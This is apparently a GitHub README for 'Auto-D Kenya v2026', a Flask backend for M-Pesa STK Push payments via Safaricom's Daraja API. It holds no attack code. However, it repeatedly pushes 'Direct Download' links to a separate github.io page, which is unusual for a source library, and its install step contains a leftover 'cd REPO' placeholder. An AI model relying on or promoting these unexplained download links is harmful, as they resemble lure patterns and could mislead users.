# Auto-D Kenya v2026 - M-Pesa backend service 2026

> **Auto-D Kenya is a Flask web backend for M-Pesa payments that connects to Safaricom's Daraja API to launch STK Push requests, process callback responses, and provide payment status checks in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/kevinmahughes2785/auto-d-kenya-v2026?style=flat-square)](https://github.com/kevinmahughes2785/auto-d-kenya-v2026)

---

<p align="center">
  <a href="https://kevinmahughes2785.github.io/auto-d-kenya-v2026/">
    <img src="https://img.shields.io/badge/Download-Auto-D%20Kenya%20Latest-brightgreen?style=for-the-badge" alt="Download Auto-D Kenya">
  </a>
</p>

> **[Direct Download - Auto-D Kenya v2026](https://kevinmahughes2785.github.io/auto-d-kenya-v2026/)**

---

[Download Latest Build](https://kevinmahughes2785.github.io/auto-d-kenya-v2026/)

---

## Overview

Auto-D Kenya provides a Flask-powered backend for managing M-Pesa payment flows through Safaricom's Daraja API. It is aimed at web applications that need a central API layer to create payment prompts, accept confirmation callbacks, and inspect transaction outcomes.

This project fits checkout systems, billing services, and other payment automation setups built around M-Pesa. Its design keeps the payment path focused on the core sequence: initiate the request, receive the callback, and check the final status, while leaving secrets and environment-specific values out of the source code.

---

## Features

- Sends M-Pesa STK Push payment requests
- Receives callback notifications from the payment gateway
- Provides an endpoint for querying payment status
- Offers a health check route for basic service monitoring
- Relies on environment variables for credentials and runtime configuration
- Uses Flask to keep the backend workflow straightforward
- Works with Safaricom Daraja API as the payment integration layer

---

## Installation

Clone the repository and install the required Python dependencies:

```bash
git clone https://github.com/kevinmahughes2785/auto-d-kenya-v2026.git
cd REPO
pip install -r requirements.txt
```

Set the required environment variables, then start the Flask application using the project's entry point or launch command for your environment.

---

## Usage

A typical flow for the service looks like this:

1. Set up your Daraja API credentials and callback configuration.
2. Launch the backend service.
3. Call the STK Push endpoint to initiate a payment prompt.
4. Wait for the callback to be delivered to your configured webhook route.
5. Use the payment status endpoint whenever you need to verify the latest outcome.

Example workflow:

```bash
export MPESA_CONSUMER_KEY="your_key"
export MPESA_CONSUMER_SECRET="your_secret"
export MPESA_SHORTCODE="your_shortcode"
export MPESA_PASSKEY="your_passkey"
python app.py
```

From there, your frontend, billing logic, or test client can connect to the exposed backend routes.

---

## Configuration

Auto-D Kenya depends on environment variables for payment credentials and related settings. Keep sensitive data outside the codebase and load it when the application starts.

Example setup:

```bash
MPESA_CONSUMER_KEY=your_consumer_key
MPESA_CONSUMER_SECRET=your_consumer_secret
MPESA_SHORTCODE=your_shortcode
MPESA_PASSKEY=your_passkey
MPESA_CALLBACK_URL=https://your-domain.example/callback
```

If you prefer a `.env` file or a deployment secret store, place the same values there and make sure your Flask app reads them before startup.

---

## Requirements

- Web runtime support for Flask
- Python environment for the backend service
- Access to Safaricom Daraja API credentials
- Network access for payment requests and callback handling
- Storage or logging setup if you want to persist payment events or status data

---

## FAQ

**How can I confirm the service is active?**  
Check the health endpoint to verify that the backend is reachable.

**Where are payment outcomes delivered?**  
After an STK Push request is processed, the callback endpoint receives the payment update.

**How should I store credentials?**  
Put API keys and related values in environment variables instead of hardcoding them in the application.

**What if a payment status is not updated right away?**  
Review the callback configuration, confirm the Daraja API setup, and query the payment status endpoint for the newest known state.

**Can this be used with another web application?**  
Yes. The backend is built to sit behind a frontend, dashboard, or custom integration that needs M-Pesa payment handling.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
